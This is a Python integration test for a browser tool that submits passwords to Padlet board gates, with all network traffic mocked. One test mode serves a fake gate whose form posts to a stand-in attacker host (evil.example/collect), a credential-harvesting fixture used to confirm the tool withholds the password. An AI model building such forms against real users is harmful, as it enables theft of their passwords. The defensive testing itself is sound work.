"""Password gate integration in real Chromium; all remote traffic is mocked."""
import asyncio
import json
import sys
from pathlib import Path
from urllib.parse import parse_qs, urlsplit
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from server.browser import BrowserSession, BrowserHTTP
from server.engine import Sender

URL = "https://padlet.com/example/board"
PASSWORD = "fixture-board-secret"
BOOTSTRAP = '<meta name="csrf-token" content="fixture"><script>window.ww={uid:"fixture"}</script>'

async def main():
    cases = []
    for mode, supplied, expected in [
        ("correct", PASSWORD, True), ("forbidden_gate", PASSWORD, True),
        ("wrong", "wrong-secret", False), ("missing", None, False),
        ("login", PASSWORD, False), ("external", PASSWORD, False),
        ("challenge", PASSWORD, False)]:
        attempts = []
        def gate():
            action = "https://evil.example/collect" if mode == "external" else URL
            email = '<input type="email">' if mode == "login" else ''
            return '<html><body><form method="post" action="'+action+'">'+email+'<input name="password" type="password"><button type="submit">Go</button></form></body></html>'
        async def route(self, route):
            request = route.request
            assert urlsplit(request.url).hostname == "padlet.com"
            if request.method == "POST":
                assert request.url == URL
                attempts.append(parse_qs(request.post_data)["password"][0])
                if mode in {"correct", "forbidden_gate"} and attempts[-1] == PASSWORD:
                    return await route.fulfill(content_type="text/html", body=BOOTSTRAP,
                        headers={"Set-Cookie":"board_access=fixture; Secure; HttpOnly; Path=/"})
                return await route.fulfill(content_type="text/html", body=gate())
            if "/api/11/" in request.url:
                headers = await request.all_headers()
                assert "board_access=fixture" in headers.get("cookie", "")
                return await route.fulfill(json={"authorized": True})
            if request.url == URL:
                headers = {"cf-mitigated":"challenge"} if mode == "challenge" else {}
                return await route.fulfill(status=403 if mode in {"challenge","forbidden_gate"} else 200,
                                           content_type="text/html", headers=headers, body=gate())
            await route.abort()
        sender = Sender()
        browser = BrowserSession(sender)
        browser.capture_enabled = False
        with patch.object(BrowserSession, "route", route):
            try:
                try:
                    await browser.open(URL, password=supplied)
                    success = True
                except ValueError as error:
                    success = False
                    assert PASSWORD not in str(error) and "wrong-secret" not in str(error)
                assert success == expected, mode
                if expected:
                    light = await browser.sending_page()
                    transport = BrowserHTTP(light, "https://padlet.com/api/9/wishes")
                    result = await transport.get("https://padlet.com/api/11/padlet-starting-state/example/board")
                    assert result.json() == {"authorized": True}
                    assert PASSWORD not in json.dumps(await browser.snapshot())
                assert len(attempts) == (1 if mode in {"correct","forbidden_gate","wrong"} else 0)
                assert PASSWORD not in json.dumps(sender.status())
                cases.append(mode)
            finally:
                await browser.close()
    print(json.dumps({"password_gate_cases": cases, "real_auth_attempts": 0, "real_posts": 0}))

if __name__ == "__main__":
    asyncio.run(main())
